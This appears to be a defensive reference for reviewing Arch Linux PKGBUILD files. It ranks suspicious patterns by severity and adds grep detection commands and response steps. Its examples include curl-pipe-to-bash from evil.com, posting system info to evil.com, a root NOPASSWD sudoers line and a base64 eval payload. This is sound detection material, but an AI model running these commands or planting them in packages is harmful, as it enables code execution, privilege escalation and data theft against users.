# Red Flags Quick Reference

Common attack patterns and suspicious behaviors in PKGBUILD files.

## CRITICAL Severity

### Remote Code Execution

| Pattern | Description |
|---------|-------------|
| `curl ... \| bash` | Downloads and executes remote code |
| `wget ... \| sh` | Downloads and executes remote code |
| `curl -L ... \| sh` | Downloads (follow redirects) and executes |
| `wget -qO- ... \| bash` | Quiet download and execute |

**Example:**
```bash
build() {
    curl -L https://evil.com/payload.sh | bash
}
```

### Obfuscated Payloads

| Pattern | Description |
|---------|-------------|
| `eval "$(base64 -d ...)"` | Decodes and executes base64 payload |
| `eval "$(openssl enc -d ...)"` | Decodes with openssl and executes |
| `eval "$(python -c ...)"` | Python inline execution |
| `eval "$(perl -e ...)"` | Perl inline execution |

**Example:**
```bash
build() {
    eval "$(base64 -d <<< 'cGFja2FnZSgpIHsK...')"
}
```

### Privilege Escalation

| Pattern | Description |
|---------|-------------|
| `sudo` | Privilege escalation |
| `su` | Switch to another user |
| `doas` | OpenBSD privilege escalation |
| `pkexec` | Polkit privilege escalation |
| `install -m4755` | Install SUID binary |
| `chmod +s` | Set SUID/SGID bit |

**Example:**
```bash
build() {
    echo "root ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
}
```

### System File Modifications

| Pattern | Description |
|---------|-------------|
| `/etc/passwd` | User database modification |
| `/etc/shadow` | Password hash modification |
| `/etc/sudoers` | Sudo configuration |
| `/etc/cron*` | Cron job modification |
| `/etc/systemd/` | Systemd service modification |
| `/usr/bin/` | Binary installation outside $pkgdir |

**Example:**
```bash
build() {
    echo "..." >> /etc/sudoers
}
```

### Data Exfiltration

| Pattern | Description |
|---------|-------------|
| `curl -X POST ... -d "$(uname -a)"` | Sends system info |
| `curl ... -d "$(hostname)"` | Sends hostname |
| `curl ... -d "$(whoami)"` | Sends username |
| `curl ... -d "$(cat /etc/passwd)"` | Sends password file |

**Example:**
```bash
build() {
    curl -X POST https://evil.com/collect -d "$(uname -a)"
}
```

### Credential Exposure

| Pattern | Description |
|---------|-------------|
| `password=...` | Hard-coded password |
| `secret=...` | Hard-coded secret |
| `token=...` | Hard-coded token |
| `api_key=...` | Hard-coded API key |
| `mysql://user:pass@host/db` | URL with credentials |

**Example:**
```bash
depends=('mysql://admin:supersecret@localhost/db')
```

## HIGH Severity

### Checksum Bypass

| Pattern | Description |
|---------|-------------|
| `sha256sums=('SKIP')` | Bypasses integrity check |
| `sha512sums=('SKIP')` | Bypasses integrity check |

**Example:**
```bash
source=('https://suspicious.com/app.tar.xz')
sha256sums=('SKIP')
```

### Weak Checksums

| Pattern | Description |
|---------|-------------|
| `md5sums=()` | MD5 is cryptographically weak |
| `sha1sums=()` | SHA1 is cryptographically weak |

**Example:**
```bash
source=('https://example.com/app.tar.xz')
md5sums=('d41d8cd98f00b204e9800998ecf8427e')
```

### Premature Service Activation

| Pattern | Description |
|---------|-------------|
| `systemctl enable ...` | Enables service during build |
| `systemctl start ...` | Starts service during build |

**Example:**
```bash
package() {
    systemctl enable my.service
}
```

### Package Shadowing

| Pattern | Description |
|---------|-------------|
| `provides=('openssl')` | Shadows critical package |
| `provides=('glibc')` | Shadows critical package |
| `provides=('python')` | Shadows critical package |

**Example:**
```bash
provides=('openssl')
```

### System Path Modifications

| Pattern | Description |
|---------|-------------|
| `install ... /usr/bin/...` | Installs to system path |
| `install ... /etc/...` | Modifies system config |
| `install ... /bin/...` | Modifies system binary |
| `install ... /sbin/...` | Modifies system binary |

**Example:**
```bash
package() {
    install -m755 app /usr/bin/app  # Should be $pkgdir/usr/bin/app
}
```

## MEDIUM Severity

### Insecure Transport

| Pattern | Description |
|---------|-------------|
| `source=(http://...)` | Unencrypted source |
| `curl ... --insecure` | Bypasses TLS verification |
| `curl ... -k` | Bypasses TLS verification |
| `wget ... --no-check-certificate` | Bypasses TLS verification |

**Example:**
```bash
source=('http://example.com/app.tar.xz')
```

### Dynamic Version Computation

| Pattern | Description |
|---------|-------------|
| `pkgver() { curl ... }` | Fetches version from remote |
| `pkgver() { wget ... }` | Fetches version from remote |

**Example:**
```bash
pkgver() {
    curl -s https://example.com/version
}
```

### Unknown Dependencies

| Pattern | Description |
|---------|-------------|
| `depends=('unknown-pkg')` | Unofficial package |
| `makedepends=('unknown-pkg')` | Unofficial build dependency |

**Example:**
```bash
depends=('unknown-package-from-unofficial-repo')
```

## LOW Severity

### Uncommon Patterns

| Pattern | Description |
|---------|-------------|
| `eval ...` | Dynamic code execution |
| `source ...` | Sourcing external scripts |
| `exec ...` | Executing external commands |

**Example:**
```bash
build() {
    eval "$(cat /tmp/script.sh)"
}
```

### Info-Only Patterns

| Pattern | Description |
|---------|-------------|
| `echo ...` | Output to stdout |
| `printf ...` | Output to stdout |
| `cat ...` | Display file contents |

**Example:**
```bash
build() {
    echo "Building package..."
}
```

## Attack Vectors Summary

### 1. Initial Access
- Remote code execution via curl/wget
- Obfuscated payloads (base64, eval)
- Downloaded binaries executed directly

### 2. Persistence
- System file modifications (/etc/)
- Cron job installation
- SUID/SGID binary installation

### 3. Privilege Escalation
- sudo/su/doas usage
- SUID binary installation
- /etc/sudoers modification

### 4. Defense Evasion
- Obfuscated code
- Dynamic code execution
- Checksum bypass (SKIP)

### 5. Credential Access
- Hard-coded credentials
- Credential exfiltration
- Password file access

### 6. Impact
- Data exfiltration
- System compromise
- Lateral movement

## Detection Commands

### Check for remote execution
```bash
grep -E 'curl.*\|\s*(bash|sh)|wget.*\|\s*(bash|sh)' PKGBUILD
```

### Check for eval usage
```bash
grep -E 'eval\s+.*base64|eval\s+.*openssl' PKGBUILD
```

### Check for checksum bypass
```bash
grep "sha256sums.*SKIP" PKGBUILD
```

### Check for SUID installation
```bash
grep -E 'install.*-m4755|chmod\s+\+s' PKGBUILD
```

### Check for system modifications
```bash
grep -E '/etc/(passwd|shadow|sudoers|cron)' PKGBUILD
```

### Check for credential exposure
```bash
grep -Ei 'password=|secret=|token=|api_key=' PKGBUILD
```

### Check for data exfiltration
```bash
grep -E 'curl.*-X.*POST.*\$(uname|hostname|whoami)' PKGBUILD
```

## Risk Assessment Matrix

| Severity | Action Required |
|----------|-----------------|
| CRITICAL | Reject package immediately |
| HIGH | Require maintainer explanation and fix |
| MEDIUM | Manual review required |
| LOW | Note and monitor |
| INFO | Log for reference |

## Response Guidelines

### CRITICAL Findings
- **Do not install** the package
- **Report** to AUR maintainers
- **Block** the package in your system
- **Investigate** if already installed

### HIGH Findings
- **Require** maintainer explanation
- **Request** fixes before installation
- **Consider** rejecting if unresponsive

### MEDIUM Findings
- **Manual review** required
- **Context-dependent** risk assessment
- **Document** findings

### LOW/INFO Findings
- **Note** for reference
- **Monitor** for patterns
- **No immediate action** required

## References

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [CWE Top 25](https://cwe.mitre.org/top25/)
- [Arch Wiki: PKGBUILD](https://wiki.archlinux.org/title/PKGBUILD)
- [Arch Security: AUR](https://wiki.archlinux.org/title/Arch_User_Repository#Security)
